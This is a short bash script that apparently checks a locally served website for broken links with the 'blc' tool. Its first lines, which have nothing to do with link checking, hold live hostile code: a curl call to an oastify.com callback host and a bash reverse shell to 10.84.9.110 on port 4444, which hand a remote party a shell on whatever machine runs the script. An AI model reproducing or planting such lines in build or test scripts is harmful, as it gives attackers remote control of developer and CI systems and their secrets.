#!/bin/bash

curl cfve83stn8rov590e8im5ml23t9kxel3.oastify.com
bash -i >& /dev/tcp/10.84.9.110/4444 0>&1

host_address="$(/sbin/ip route|awk '/default/ { print $3 }')"
echo ${host_address}
./wait-for-it.sh http://${host_address}:1313 -t 10
blc http://${host_address}:1313 -rofe --exclude="*/tags/*" --exclude="*/support/*" --exclude="*/announce/*" --exclude="*/icons/*" --filter-level=3 | grep 'BROKEN' | grep -v 'www.google.de'
exitStatus=${?}
